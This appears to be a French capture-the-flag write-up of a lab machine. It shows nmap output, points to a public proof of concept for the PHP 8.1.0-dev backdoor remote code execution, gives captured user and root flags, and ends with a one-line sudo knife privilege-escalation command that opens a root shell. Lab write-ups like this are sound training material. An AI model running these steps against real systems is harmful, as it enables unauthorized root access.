# Target : 10.129.57.148

# Enumeration des ports et services

```js
nmap -sV -sC 10.129.57.148 -O
```

```js
Starting Nmap 7.99 ( https://nmap.org ) at 2026-07-28 21:30 +0000
Nmap scan report for 10.129.57.148
Host is up (0.27s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 be:54:9c:a3:67:c3:15:c3:64:71:7f:6a:53:4a:4c:21 (RSA)
|   256 bf:8a:3f:d4:06:e9:2e:87:4e:c9:7e:ab:22:0e:c0:ee (ECDSA)
|_  256 1a:de:a1:cc:37:ce:53:bb:1b:fb:2b:0b:ad:b3:f6:84 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title:  Emergent Medical Idea
Device type: general purpose
Running: Linux 5.X
OS CPE: cpe:/o:linux:linux_kernel:5
OS details: Linux 5.0 - 5.14
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 81.76 seconds
```

# Enumeration http

![](/assets/Pasted-image-20260728213740.png)

La version `8.1.0-dev` du php est vuln a un RCE

## PoC : https://github.com/flast101/php-8.1.0-dev-backdoor-rce

![](/assets/Pasted-image-20260728214619.png)

# User flag : 61072335f3b716fb78dc1a582b00d02c

![](/assets/Pasted-image-20260728215446.png)

### Payload 

```js
sudo knife exec -E 'exec "/bin/sh"'
```

![](/assets/Pasted-image-20260728215556.png)
# Root Flag : 551a440a47699da2b04a9e3f79d1e828